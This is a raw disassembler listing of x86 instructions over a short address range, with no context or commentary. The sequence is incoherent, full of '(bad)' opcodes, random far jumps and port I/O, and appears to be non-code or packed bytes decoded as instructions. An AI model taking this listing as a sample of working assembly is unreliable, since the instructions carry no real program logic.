  41f124:	cmp    BYTE PTR [eax+0x13],0xf0
  41f128:	cwde   
  41f129:	aam    0xe5
  41f12b:	inc    esp
  41f12c:	pop    edi
  41f12d:	xchg   eax,edx
  41f12f:	inc    edi
  41f130:	sbb    bh,BYTE PTR [ecx+0x67]
  41f133:	pop    es
  41f134:	xor    bl,bh
  41f136:	scas   al,BYTE PTR es:[edi]
  41f137:	adc    eax,0x206f2c9
  41f13c:	inc    ebp
  41f13d:	lods   eax,DWORD PTR ds:[esi]
  41f13e:	pusha  
  41f13f:	xor    al,BYTE PTR [ebp+0x6e0c042a]
  41f145:	inc    ebx
  41f146:	das    
  41f147:	mov    eax,0xd62d31b7
  41f14c:	mov    edi,0xbcd30db5
  41f151:	inc    esp
  41f152:	inc    eax
  41f153:	das    
  41f154:	cld    
  41f155:	dec    ebp
  41f156:	out    0x6d,al
  41f158:	retf   
  41f159:	leave  
  41f15a:	in     eax,dx
  41f15b:	pop    ecx
  41f15c:	(bad)  
  41f15d:	(bad)  
  41f15e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f15f:	dec    esp
  41f160:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41f162:	inc    edx
  41f163:	fimul  DWORD PTR [eax+0x18]
  41f166:	(bad)  
  41f168:	jle    0x41f161
  41f16a:	or     edi,ebp
  41f16c:	jnp    0x41f134
  41f16e:	(bad)  
  41f170:	or     bl,BYTE PTR [ebp-0x64]
  41f173:	clc    
  41f174:	mov    dh,BYTE PTR [edi-0x79]
  41f177:	adc    eax,0xb63b676d
  41f17c:	ins    DWORD PTR es:[edi],dx
  41f17d:	pop    ss
  41f17e:	fsub   QWORD PTR [edx-0x34]
  41f181:	test   eax,0x749ca6a3
  41f186:	loop   0x41f123
  41f188:	test   ecx,ecx
  41f18a:	ja     0x41f1a1
  41f18c:	add    eax,0xfb479c7f
  41f191:	mov    bl,0x18
  41f193:	mul    BYTE PTR [eax-0x38]
  41f196:	pop    ss
  41f197:	adc    DWORD PTR [edx+0x34],0x76
  41f19b:	in     eax,dx
  41f19c:	dec    esi
  41f19d:	cld    
  41f19e:	in     eax,dx
  41f19f:	retf   0x26ae
  41f1a2:	mov    ah,0xef
  41f1a4:	ficomp WORD PTR [ebp-0x50]
  41f1a7:	sbb    dh,BYTE PTR [ecx+0x56]
  41f1aa:	mov    dl,0x26
  41f1ac:	sub    dh,ah
  41f1ae:	dec    esp
  41f1af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1b0:	pop    esi
  41f1b1:	nop
  41f1b2:	mov    ch,0x76
  41f1b4:	push   ebx
  41f1b5:	mov    ebp,0x8dfea8e3
  41f1ba:	in     al,dx
  41f1bb:	adc    al,0x5f
  41f1bd:	dec    esi
  41f1be:	or     BYTE PTR gs:[ebp+0x613848d5],bh
  41f1c5:	in     eax,dx
  41f1c6:	and    DWORD PTR [edi+0x59a94379],0xffffff88
  41f1cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1ce:	and    al,0xc
  41f1d0:	sti    
  41f1d1:	in     eax,dx
  41f1d2:	pop    edx
  41f1d3:	lods   al,BYTE PTR ds:[esi]
  41f1d4:	pop    ecx
  41f1d5:	outs   dx,DWORD PTR ds:[esi]
  41f1d6:	sbb    BYTE PTR [ebp-0x1b8237fa],0x17
  41f1dd:	xchg   ebx,eax
  41f1de:	mul    DWORD PTR [esi-0x7a]
  41f1e1:	lock inc ecx
  41f1e3:	cmp    al,0x8c
  41f1e5:	xchg   ebx,eax
  41f1e6:	and    al,0x17
  41f1e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1e9:	pusha  
  41f1ea:	loope  0x41f18b
  41f1ec:	jg     0x41f1c1
  41f1ee:	xor    BYTE PTR [eax-0x25],cl
  41f1f1:	cdq    
  41f1f2:	scas   al,BYTE PTR es:[edi]
  41f1f3:	cmp    eax,0x879b84d2
  41f1f8:	cmp    bh,dh
  41f1fa:	fist   WORD PTR [eax+ebx*2+0x741bdf76]
  41f201:	(bad)  
  41f202:	push   ebx
  41f203:	das    
  41f204:	xor    DWORD PTR [edi],ebx
  41f206:	push   edx
  41f207:	sbb    bl,BYTE PTR ds:0x54bd4303
  41f20d:	enter  0x1c24,0xa7
  41f211:	dec    ebx
  41f212:	rol    DWORD PTR [ecx],1
  41f214:	ret    
  41f215:	fld    DWORD PTR [eax-0x7484b716]
  41f21b:	div    BYTE PTR ds:0xd92e4b6e
  41f221:	pop    eax
  41f222:	addr16 cmp al,0xbd
  41f225:	out    0xb0,al
  41f227:	inc    esp
  41f228:	inc    edx
  41f229:	adc    ecx,DWORD PTR [esi]
  41f22b:	jmp    FWORD PTR [esi-0x28]
  41f22e:	lds    ecx,FWORD PTR [ecx+eax*8]
  41f231:	sub    BYTE PTR [ebp+0x47],cl
  41f234:	mov    ebx,0x40cebeed
  41f239:	loop   0x41f1e0
  41f23b:	or     ah,BYTE PTR [ebx-0x37f16186]
  41f241:	mov    ebx,0x71d2669
  41f246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f247:	mov    ds:0x13dca62f,eax
  41f24c:	std    
  41f24d:	into   
  41f24e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f24f:	retf   0x26e2
  41f252:	test   BYTE PTR [ecx+0x29],0xd9
  41f256:	or     eax,0x8005d1ce
  41f25b:	mov    edi,0x82e10bef
  41f260:	lods   eax,DWORD PTR ds:[esi]
  41f261:	push   0x986215c9
  41f266:	jnp    0x41f2ca
  41f268:	nop
  41f269:	or     ebp,0x590c14a8
  41f26f:	push   cs
  41f270:	xchg   esi,eax
  41f271:	call   0x4f8f932
  41f276:	mov    edx,0x12380b3b
  41f27b:	aaa    
  41f27c:	sub    eax,0xf1be90c0
  41f281:	mov    edi,0x57583221
  41f286:	loopne 0x41f2a8
  41f288:	cld    
  41f289:	aam    0xaa
  41f28b:	into   
  41f28c:	xor    BYTE PTR [edi-0x72b48b05],dl
  41f292:	push   ebx
  41f293:	frstor [ecx-0x51]
  41f296:	(bad)  
  41f297:	pop    esi
  41f298:	pop    eax
  41f299:	adc    al,0xdf
  41f29b:	inc    edx
  41f29c:	add    al,0xd6
  41f29e:	xchg   edx,eax
  41f29f:	mov    edx,0x1efa804a
  41f2a4:	sahf   
  41f2a5:	arpl   bx,ax
  41f2a7:	xor    DWORD PTR [edx+0x13],0xffffffef
  41f2ab:	mov    ebp,0x4f83ffa6
  41f2b0:	aad    0xc8
  41f2b2:	inc    ecx
  41f2b3:	addr16 icebp 
  41f2b5:	lods   al,BYTE PTR ds:[esi]
  41f2b6:	pop    ds
  41f2b7:	xor    al,0xfe
  41f2b9:	jo     0x41f305
  41f2bb:	stc    
  41f2bc:	aaa    
  41f2bd:	test   dh,0xbd
  41f2c0:	aas    
  41f2c1:	popf   
  41f2c2:	je     0x41f2f6
  41f2c4:	ins    DWORD PTR es:[edi],dx
  41f2c5:	mov    eax,0x3297c538
  41f2ca:	inc    esi
  41f2cb:	dec    ebp
  41f2cc:	xor    eax,0x154e80ac
  41f2d1:	jl     0x41f305
  41f2d3:	push   eax
  41f2d4:	lods   eax,DWORD PTR ds:[esi]
  41f2d5:	xor    al,0xda
  41f2d7:	pop    ds
  41f2d8:	cli    
  41f2d9:	mov    ds:0xfece3923,eax
  41f2de:	clc    
  41f2df:	out    0xf9,al
  41f2e1:	ds in  eax,dx
  41f2e3:	mov    bh,0x93
  41f2e5:	sbb    bh,BYTE PTR [ebx+0x4e]
  41f2e8:	ds adc al,0xef
  41f2eb:	mov    al,0xc7
  41f2ed:	push   esp
  41f2ee:	jle    0x41f2c0
  41f2f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2f1:	jns    0x41f300
  41f2f3:	aad    0xa8
  41f2f5:	jne    0x41f2f6
  41f2f7:	adc    DWORD PTR [ebx],edi
  41f2f9:	adc    eax,0x2bd4bb41
  41f2fe:	push   eax
  41f2ff:	push   ds
  41f300:	test   eax,0x5803afa7
  41f305:	movhps QWORD PTR [eax+edi*2],xmm5
  41f309:	addr16 xchg ebx,eax
  41f30b:	add    al,0x26
  41f30d:	test   BYTE PTR [esi],dh
  41f30f:	lock sbb eax,0xd8affb82
  41f315:	(bad)  
  41f316:	jbe    0x41f2c2
  41f318:	jnp    0x41f361
  41f31a:	lds    edi,FWORD PTR [edi-0x5a]
  41f31d:	or     BYTE PTR [ebx+0x2261aa32],dh
  41f323:	adc    ah,bl
  41f325:	xchg   edx,esi
  41f327:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f328:	push   esp
  41f329:	jg     0x41f2f8
  41f32b:	jp     0x41f2b6
  41f32d:	ret    
  41f32e:	aaa    
  41f32f:	mov    edi,0x2efa049d
  41f334:	(bad)  
  41f335:	xlat   BYTE PTR ds:[ebx]
  41f336:	mov    esi,0x1d4509bb
  41f33b:	jnp    0x41f312
  41f33d:	pop    ds
  41f33e:	sub    BYTE PTR [ebp-0x24],dh
  41f341:	fdiv   QWORD PTR [ecx-0x3d8f552b]
  41f347:	and    BYTE PTR [esi],dl
  41f349:	jbe    0x41f334
  41f34b:	jb     0x41f34c
  41f34d:	add    dl,BYTE PTR [di+0x42]
  41f351:	dec    ebp
  41f352:	sub    al,0xd1
  41f354:	jnp    0x41f317
  41f356:	sub    DWORD PTR [eax],esp
  41f358:	out    0xaa,eax
  41f35a:	ror    DWORD PTR [edx+0x498a825],1
  41f360:	(bad)  
  41f361:	aad    0x38
  41f363:	adc    DWORD PTR [edi-0xe3aa7b0],ecx
  41f369:	iret   
  41f36a:	sub    al,0xc0
  41f36c:	call   0xb93a:0x2fc97582
  41f373:	sub    BYTE PTR [esi],bh
  41f375:	push   es
  41f376:	xchg   ebp,eax
  41f377:	je     0x41f3b0
  41f379:	outs   dx,BYTE PTR ds:[esi]
  41f37a:	ror    BYTE PTR [edi],0x16
  41f37d:	loope  0x41f31e
  41f37f:	imul   DWORD PTR [esi+edx*1]
  41f382:	jp     0x41f31a
  41f384:	mov    al,ds:0xc3fde72c
  41f389:	es out 0x57,al
  41f38c:	adc    eax,0x165290c6
  41f391:	pop    esp
  41f392:	fisub  DWORD PTR [esi]
  41f394:	adc    bh,BYTE PTR [esi+0xd]
  41f397:	lods   eax,DWORD PTR ds:[esi]
  41f398:	inc    esi
  41f399:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f39a:	je     0x41f3a2
  41f39c:	stos   DWORD PTR es:[edi],eax
  41f39d:	ror    BYTE PTR [ecx-0x4e],0xd8
  41f3a1:	sub    al,0x1f
  41f3a3:	test   BYTE PTR [esi],bl
  41f3a5:	pop    ecx
  41f3a6:	adc    BYTE PTR [ebx+0x6e],dl
  41f3a9:	mov    edi,0x28383290
  41f3ae:	fstp   DWORD PTR [ebx]
  41f3b0:	add    DWORD PTR [ebp+0x73],edx
  41f3b3:	sar    DWORD PTR [ebx+esi*4-0x581febd0],0xf0
  41f3bb:	hlt    
  41f3bc:	les    ebp,FWORD PTR [ebx-0x54]
  41f3bf:	mov    fs,WORD PTR [eax+0x30]
  41f3c2:	push   eax
  41f3c3:	push   esp
  41f3c4:	sub    al,BYTE PTR [edx-0x5cf4ec60]
  41f3ca:	mov    ds,WORD PTR [ecx]
  41f3cc:	imul   esp,DWORD PTR [esi],0xffffff8f
  41f3cf:	in     eax,0x4
  41f3d1:	push   0xffffffa5
  41f3d3:	xor    BYTE PTR [ebx+edi*4-0x16],cl
  41f3d7:	pop    esi
  41f3d8:	dec    ecx
  41f3d9:	jl     0x41f44b
  41f3db:	push   es
  41f3dc:	ret    0xda86
  41f3df:	mov    al,ds:0x9360c0b9
  41f3e4:	aad    0x11
  41f3e6:	or     esp,edi
  41f3e8:	xchg   edx,eax
  41f3e9:	sti    
  41f3ea:	or     DWORD PTR [eax+0x1],eax
  41f3ed:	jno    0x41f3fc
  41f3ef:	add    ebp,DWORD PTR [edi+0x6aa83001]
  41f3f5:	xor    dl,ch
  41f3f7:	dec    ebp
  41f3f8:	xor    esp,ebp
  41f3fa:	std    
  41f3fb:	cld    
  41f3fc:	imul   ebx,edx,0xffffff93
  41f3ff:	push   ecx
  41f400:	fstp   TBYTE PTR [eax-0x50]
  41f403:	ror    DWORD PTR [edi+0x4],cl
  41f406:	mov    ecx,DWORD PTR [edi]
  41f408:	js     0x41f39e
  41f40a:	leave  
  41f40b:	xchg   edx,eax
  41f40c:	imul   edx,DWORD PTR [edi],0x57994997
  41f412:	jno    0x41f3b2
  41f414:	in     eax,dx
  41f415:	adc    DWORD PTR [edi+eax*4+0x0],0x3
  41f41a:	xchg   ebx,eax
  41f41b:	or     ah,BYTE PTR [edi]
  41f41d:	pop    es
  41f41e:	xor    DWORD PTR [ebp-0x45],ebx
  41f421:	sub    bh,BYTE PTR [edx+0x1c]
  41f424:	push   ebp
  41f425:	hlt    
  41f426:	mov    ch,0x73
  41f428:	leave  
  41f429:	lock xchg edi,eax
  41f42b:	out    0x99,eax
  41f42d:	mov    ebx,0x54b839af
  41f432:	add    edx,DWORD PTR [ebp+0x60]
  41f435:	xchg   ebp,eax
  41f436:	pop    esp
  41f437:	cdq    
  41f438:	and    BYTE PTR [edi+ebx*8-0x80],bl
  41f43c:	stc    
  41f43d:	cmovle esp,DWORD PTR [ebp+0x1f]
  41f441:	lds    ecx,FWORD PTR ds:0x834584b4
  41f447:	xchg   edi,eax
  41f448:	add    BYTE PTR [eax],al
  41f44a:	push   edx
  41f44b:	dec    ebp
  41f44c:	dec    esp
  41f44d:	inc    ebp
  41f44e:	pop    edi
  41f44f:	inc    ebp
  41f450:	pop    ebx
  41f451:	pop    edi
  41f452:	shr    BYTE PTR [esi+0x27],0x49
  41f456:	int    0x7d
  41f458:	popa   
  41f459:	jne    0x41f431
  41f45b:	add    DWORD PTR [ecx],0x0
  41f45e:	xchg   BYTE PTR [esi],al
  41f460:	add    BYTE PTR [eax],al
  41f462:	into   
  41f463:	test   BYTE PTR [eax+0x46b666be],dh
  41f469:	inc    eax
  41f46a:	popf   
  41f46b:	push   0x48
  41f46d:	pusha  
  41f46e:	aam    0xf
  41f470:	retf   
  41f471:	lahf   
  41f472:	lds    ecx,FWORD PTR ds:0xaf46d7dd
  41f478:	test   BYTE PTR [eax],cl
  41f47a:	mov    bl,0x69
  41f47c:	fs inc ebx
  41f47e:	rol    DWORD PTR [edx+0x7124d52a],1
  41f484:	mov    bl,dl
  41f486:	fld    st(7)
  41f488:	cmp    DWORD PTR [esi+edi*2+0x38495457],ebp
  41f48f:	jb     0x41f44c
  41f491:	jmp    0xe29d:0xd3234682
  41f498:	add    eax,0xb29cf081
  41f49d:	pop    ss
  41f49e:	fstp   DWORD PTR [ebx]
  41f4a0:	call   0xe4ded86b
  41f4a5:	mov    ah,0x3
  41f4a7:	or     DWORD PTR [ebp-0x35c5aac6],ecx
  41f4ad:	push   ds
  41f4ae:	xor    dh,0xc0
  41f4b1:	xor    al,0x48
  41f4b3:	xor    ch,BYTE PTR [eax+0x16cc1a52]
  41f4b9:	scas   eax,DWORD PTR es:[edi]
  41f4ba:	icebp  
  41f4bb:	ja     0x41f4a5
  41f4bd:	mov    eax,ds:0xc6e7cf9f
  41f4c2:	aas    
  41f4c3:	xchg   esi,eax
  41f4c4:	int3   
  41f4c5:	cmp    bh,al
  41f4c7:	add    ebx,DWORD PTR [ebx-0x42]
  41f4ca:	pop    edi
  41f4cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4cc:	dec    eax
  41f4cd:	das    
  41f4ce:	jbe    0x41f506
  41f4d0:	pusha  
  41f4d1:	adc    BYTE PTR ds:0xb4c8ab28,bl
  41f4d7:	sbb    BYTE PTR [edx],ah
  41f4d9:	jmp    0xd210:0xb511173d
  41f4e0:	mov    ecx,0xb52e94dc
  41f4e5:	ja     0x41f504
  41f4e7:	cs retf 
  41f4e9:	or     ch,BYTE PTR ds:[edx+0x50e433d6]
  41f4f0:	ja     0x41f4b7
  41f4f2:	(bad)  
  41f4f3:	bound  eax,QWORD PTR [edx+0x497682a4]
  41f4f9:	or     eax,0xf509db3b
  41f4fe:	sbb    bh,BYTE PTR [eax-0x1d]
  41f501:	mov    esi,0xcb3b2c57
  41f506:	or     DWORD PTR [edi+ecx*2-0x59],eax
  41f50a:	cwde   
  41f50b:	sub    al,0xbf
  41f50d:	push   0x787ce875
  41f512:	xor    eax,0xcc58e46b
  41f517:	addr16 imul edx,eax,0x35
  41f51b:	ret    
  41f51c:	jae    0x41f509
  41f51e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f51f:	cmp    BYTE PTR [ebx],ch
  41f521:	cwde   
  41f522:	push   esi
  41f523:	into   
  41f524:	icebp  
  41f525:	push   edx
  41f526:	ja     0x41f532
  41f528:	push   0xffffffae
  41f52a:	adc    BYTE PTR [edi+0x541041b3],dl
  41f530:	pop    eax
  41f531:	dec    ebp
  41f532:	stos   DWORD PTR es:[edi],eax
  41f533:	in     eax,dx
  41f534:	sbb    eax,0x50300b7
  41f539:	and    al,0x9a
  41f53b:	cli    
  41f53c:	adc    esp,DWORD PTR [ecx-0x5dac8892]
  41f542:	adc    al,0x39
  41f544:	neg    BYTE PTR [edx]
  41f546:	pop    ebp
  41f547:	lock mov dl,0x8e
  41f54a:	pop    ebx
  41f54b:	or     ecx,DWORD PTR [ecx-0x4ab8ec8]
  41f551:	fninit 
  41f553:	lahf   
  41f554:	cwde   
  41f555:	sahf   
  41f556:	retf   0x425e
  41f559:	out    dx,al
  41f55a:	lods   eax,DWORD PTR ds:[esi]
  41f55b:	lds    edx,FWORD PTR [eax+0x62b3ec45]
  41f561:	fild   QWORD PTR [esi+esi*1-0x70]
  41f565:	inc    edi
  41f566:	xchg   edi,eax
  41f567:	cs (bad) 
  41f569:	scas   al,BYTE PTR es:[edi]
  41f56a:	xor    edi,DWORD PTR [ecx+0x194f1b53]
  41f570:	retf   
  41f571:	pop    edi
  41f572:	aad    0xb6
  41f574:	dec    edi
  41f575:	add    eax,0xf97c6cb7
  41f57a:	sti    
  41f57b:	aaa    
  41f57c:	jne    0x41f51f
  41f57e:	mov    dl,0xbc
  41f580:	jne    0x41f557
  41f582:	pop    esp
  41f583:	fs push edi
  41f585:	call   0xbfca:0x21a4ef12
  41f58c:	add    edi,DWORD PTR [edx-0x31f03f60]
  41f592:	inc    esi
  41f593:	pusha  
  41f594:	(bad)  
  41f595:	xchg   ebx,eax
  41f596:	and    ebp,ecx
  41f598:	cwde   
  41f599:	adc    ch,ch
  41f59b:	cwde   
  41f59c:	xor    eax,0x77d9e6df
  41f5a1:	sub    ebp,ebx
  41f5a3:	inc    ecx
  41f5a4:	xchg   esp,eax
  41f5a5:	icebp  
  41f5a6:	push   ecx
  41f5a7:	pop    eax
  41f5a8:	jns    0x41f55a
  41f5aa:	repz inc ebx
  41f5ac:	and    DWORD PTR [ebx+0x65031cf6],edi
  41f5b2:	cs push esi
  41f5b4:	mov    al,0x24
  41f5b6:	daa    
  41f5b7:	jle    0x41f587
  41f5b9:	xor    DWORD PTR [ecx-0xb1fe5b8],ecx
  41f5bf:	es pop ebx
  41f5c1:	sbb    DWORD PTR ds:[esi+0x2b],edx
  41f5c5:	dec    BYTE PTR [edx]
  41f5c7:	dec    ebx
  41f5c8:	mov    edx,0xf747515f
  41f5cd:	adc    edx,DWORD PTR [eax+0x60c90f40]
  41f5d3:	cmp    ebx,DWORD PTR [ecx+0x5bc20307]
  41f5d9:	mov    dl,0x4f
  41f5db:	push   edi
  41f5dc:	int3   
  41f5dd:	sbb    esp,DWORD PTR [esi+0x57]
  41f5e0:	lahf   
  41f5e1:	repnz daa 
  41f5e3:	popf   
  41f5e4:	test   eax,0x7e1e750f
  41f5e9:	xchg   ebp,eax
  41f5ea:	jge    0x41f5f0
  41f5ec:	pop    si
  41f5ee:	inc    ebx
  41f5ef:	or     esi,eax
  41f5f1:	mov    bl,BYTE PTR [edx-0x45]
  41f5f4:	shl    ebx,cl
  41f5f6:	sub    eax,0xa96fceb
  41f5fb:	es test eax,0xdd6ea5b2
  41f601:	lahf   
  41f602:	sbb    al,BYTE PTR [ecx+0x12]
  41f605:	ret    
  41f606:	add    dh,bh
  41f608:	jecxz  0x41f631
  41f60a:	in     eax,dx
  41f60b:	lods   al,BYTE PTR ds:[esi]
  41f60c:	sub    eax,0x6aaffd1f
  41f611:	sub    dh,bh
  41f613:	adc    edx,DWORD PTR [edi+ebx*1-0x16]
  41f617:	ja     0x41f5b7
  41f619:	cmc    
  41f61a:	pop    ds
  41f61b:	adc    DWORD PTR [edi-0x68de4be7],esp
  41f621:	dec    edi
  41f622:	lock mov dl,0x44
  41f625:	adc    edx,DWORD PTR [eax-0x2a]
  41f628:	adc    ah,BYTE PTR [ebp+0x5d]
  41f62b:	jne    0x41f664
  41f62d:	shr    bl,cl
  41f62f:	jg     0x41f627
  41f631:	or     eax,0x34b55544
  41f636:	adc    ebp,esp
  41f638:	push   0x47
  41f63a:	mov    ah,BYTE PTR [ecx+0x49ecbfe5]
  41f640:	xor    ch,BYTE PTR [ecx]
  41f642:	and    BYTE PTR [ebx-0x49],cl
  41f645:	mov    cl,0x5b
  41f647:	xor    eax,0x4fa94b4c
  41f64c:	xchg   esp,eax
  41f64d:	fist   DWORD PTR [edi-0x6c]
  41f650:	mov    dl,0x74
  41f652:	stc    
  41f653:	inc    ebx
  41f654:	iret   
  41f655:	loop   0x41f5ed
  41f657:	jge    0x41f5e5
  41f659:	and    al,0xad
  41f65b:	pop    ecx
  41f65c:	(bad)  
  41f65d:	imul   ebx,ebx,0xffffffbb
  41f660:	mov    esi,0x38f0e9a5
  41f665:	stos   BYTE PTR es:[edi],al
  41f666:	mov    dl,0x20
  41f668:	push   esp
  41f669:	xchg   ebp,eax
  41f66a:	xchg   ecx,eax
  41f66b:	cmp    ah,BYTE PTR [ecx]
  41f66d:	pop    esi
  41f66e:	pop    ecx
  41f66f:	test   eax,0x6f7af475
  41f674:	mov    BYTE PTR [edi],dh
  41f676:	into   
  41f677:	retf   0xb019
  41f67a:	sub    DWORD PTR ds:[ebp+ebx*1+0x389a5d3a],ebp
  41f682:	std    
  41f683:	gs jae 0x41f6b3
  41f686:	fstp   TBYTE PTR [edx+0x5e]
  41f689:	and    cl,BYTE PTR [ecx+0x2e]
  41f68c:	sbb    eax,0x2812a240
  41f691:	pushf  
  41f692:	cwde   
  41f693:	and    ebx,esp
  41f695:	into   
  41f696:	ret    0x7c35
  41f699:	add    BYTE PTR [eax+ebx*8-0x2c25316],bl
  41f6a0:	cli    
  41f6a1:	fsubr  QWORD PTR [edx+eax*2-0xfe25f71]
  41f6a8:	fbstp  TBYTE PTR [edi-0xb560145]
  41f6ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6af:	pusha  
  41f6b0:	pop    esp
  41f6b1:	dec    eax
  41f6b2:	aad    0x49
  41f6b4:	inc    edx
  41f6b5:	into   
  41f6b6:	jne    0x41f6d7
  41f6b8:	pop    ss
  41f6b9:	push   esi
  41f6ba:	push   es
  41f6bb:	cli    
  41f6bc:	js     0x41f709
  41f6be:	xchg   esp,eax
  41f6bf:	hlt    
  41f6c0:	out    0x6d,al
  41f6c2:	xchg   DWORD PTR [edi+0x1b],ebx
  41f6c5:	or     ecx,ebx
  41f6c7:	retf   0x6dca
  41f6ca:	mov    ecx,0x39b1300f
  41f6cf:	mov    eax,ds:0xd05b4060
  41f6d4:	retf   
  41f6d5:	cmp    al,0x6c
  41f6d7:	test   BYTE PTR [ecx-0x7022fcec],0xc2
  41f6de:	jo     0x41f6fd
  41f6e0:	jo     0x41f754
  41f6e2:	arpl   WORD PTR [ebx],bx
  41f6e4:	je     0x41f758
  41f6e6:	icebp  
  41f6e7:	out    0x2e,eax
  41f6e9:	retf   0x77d
  41f6ec:	sbb    al,0x14
  41f6ee:	test   eax,0x255eb4d8
  41f6f3:	pusha  
  41f6f4:	(bad)  
  41f6f5:	adc    ah,BYTE PTR [edi+0x54929d6a]
  41f6fb:	pop    ebx
  41f6fc:	xchg   ebx,eax
  41f6fd:	fwait
  41f6fe:	es out dx,eax
  41f700:	fmul   st(4),st
  41f702:	sub    al,0x45
  41f704:	frstor [ebp+0x71]
  41f707:	ja     0x41f74b
  41f709:	scas   eax,DWORD PTR es:[edi]
  41f70a:	out    0xa1,al
  41f70c:	dec    edx
  41f70d:	pusha  
  41f70e:	cmp    al,0xe7
  41f711:	retf   
  41f712:	(bad)  
  41f713:	aaa    
  41f714:	adc    edx,0xcc7bc7a2
  41f71a:	int    0x40
  41f71c:	pop    esi
  41f71d:	or     DWORD PTR [edx-0x5a],ecx
  41f720:	ret    0x513f
  41f723:	jno    0x41f778
  41f725:	push   es
  41f726:	cli    
  41f727:	stc    
  41f728:	cmp    al,0xda
  41f72a:	and    al,0x5
  41f72c:	jb     0x41f76f
  41f72e:	jb     0x41f6ca
  41f730:	mov    ah,0x28
  41f732:	inc    edi
  41f733:	in     al,0x55
  41f735:	xchg   edi,eax
  41f736:	xchg   esp,eax
  41f737:	rcl    DWORD PTR [edi-0x6ed240c3],0x57
  41f73e:	jbe    0x41f72e
  41f740:	sbb    cl,dh
  41f742:	enter  0x4e45,0xac
  41f746:	dec    esi
  41f747:	aas    
  41f748:	into   
  41f749:	icebp  
  41f74a:	sub    BYTE PTR [edx-0x74ce8ca2],ch
  41f750:	(bad)  
  41f752:	jno    0x41f792
  41f754:	add    DWORD PTR [edi],ebp
  41f756:	mov    WORD PTR [ebx],ss
  41f758:	xchg   ebp,eax
  41f759:	fnsave [ebp+0x3e]
  41f75c:	jle    0x41f71b
  41f75e:	int    0xe2
  41f760:	sbb    DWORD PTR cs:0xc698a40f,ebx
  41f767:	mov    bh,0x8f
  41f769:	xchg   edx,eax
  41f76a:	cmp    al,0x74
  41f76c:	xchg   ebx,eax
  41f76d:	ficom  WORD PTR [ebx-0x6]
  41f771:	imul   eax,DWORD PTR [edx-0x7d83ca78],0xfffffffe
  41f778:	in     al,0xe7
  41f77a:	test   eax,0xe479ff98
  41f77f:	pop    esp
  41f780:	lahf   
  41f781:	adc    esi,ebx
  41f783:	mov    esp,0x377c25d4
  41f788:	in     eax,dx
  41f789:	dec    esp
  41f78a:	jne    0x41f775
  41f78c:	je     0x41f7b2
  41f78e:	sar    BYTE PTR [edi-0x58da8a0b],0x32
  41f795:	jb     0x41f7d5
  41f797:	movd   mm3,DWORD PTR [edi+0x68fd2222]
  41f79e:	popa   
  41f79f:	sbb    DWORD PTR [ecx],esp
  41f7a1:	jbe    0x41f737
  41f7a3:	mov    ah,0xbc
  41f7a5:	rcl    DWORD PTR [eax-0x772914eb],cl
  41f7ab:	jmp    0xb536:0x50c73c94
  41f7b2:	sahf   
  41f7b3:	push   edi
  41f7b4:	sbb    DWORD PTR [ebx],esp
  41f7b6:	imul   DWORD PTR [eax+0x1d2dfb2c]
  41f7bc:	sbb    DWORD PTR [edi+0x5f456124],edx
  41f7c2:	dec    DWORD PTR [eax+0x57f64ae6]
  41f7c8:	mov    al,ds:0x94d43e03
  41f7cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7ce:	mul    BYTE PTR fs:[edx+0x6780577e]
  41f7d5:	jp     0x41f803
  41f7d7:	pop    edi
  41f7d8:	jmp    0x1e52be5b
  41f7dd:	xor    eax,esi
  41f7df:	icebp  
  41f7e0:	xchg   ebp,eax
  41f7e1:	mov    al,0xb4
  41f7e3:	cli    
  41f7e4:	sub    DWORD PTR [eax],0xffffffc9
  41f7e7:	adc    eax,0x8a63784
  41f7ec:	(bad)  
  41f7ed:	call   0x60ef3b9a
  41f7f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7f3:	ds leave 
  41f7f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7f6:	adc    BYTE PTR [edi],dl
  41f7f8:	cmp    dh,BYTE PTR [ecx+0x332301b2]
  41f7fe:	inc    esp
  41f7ff:	dec    esi
  41f800:	outs   dx,BYTE PTR ds:[esi]
  41f801:	xor    eax,DWORD PTR [esp+eiz*4+0x35]
  41f805:	div    BYTE PTR [ecx-0x79]
  41f808:	cwde   
  41f809:	push   ecx
  41f80a:	xor    ebx,ebx
  41f80c:	xor    al,0x7f
  41f80e:	and    al,0xc0
  41f810:	and    ch,bl
  41f812:	idiv   BYTE PTR [edx-0x728e8e5f]
  41f818:	push   cs
  41f819:	xchg   esi,eax
  41f81a:	sub    eax,0x90e7b19e
  41f81f:	mov    ebx,0xfb12fe9a
  41f824:	test   eax,eax
  41f826:	mov    al,0x79
  41f828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f829:	push   ds
  41f82a:	popa   
  41f82b:	sub    esi,edx
  41f82d:	mov    ebp,0x7cd2ce4d
  41f832:	mov    dh,0x4e
  41f834:	push   ss
  41f835:	xor    dl,BYTE PTR [eax]
  41f837:	add    esi,ebx
  41f839:	inc    ebp
  41f83a:	shl    cl,cl
  41f83c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f83d:	mov    ebx,0xdc559610
  41f842:	or     edi,DWORD PTR [edi]
  41f844:	div    al
  41f846:	mov    WORD PTR [eax+eiz*2+0x14],fs
  41f84a:	and    bh,BYTE PTR [eax]
  41f84c:	add    eax,0x24f14109
  41f851:	gs jmp 0x41f84e
  41f854:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f855:	dec    ecx
  41f856:	mov    esi,0xb7b5463b
  41f85b:	push   eax
  41f85c:	mov    eax,0x63f513f0
  41f861:	(bad)
  41f864:	(bad)  
  41f865:	out    0x71,eax
  41f867:	dec    ecx
  41f868:	cmc    
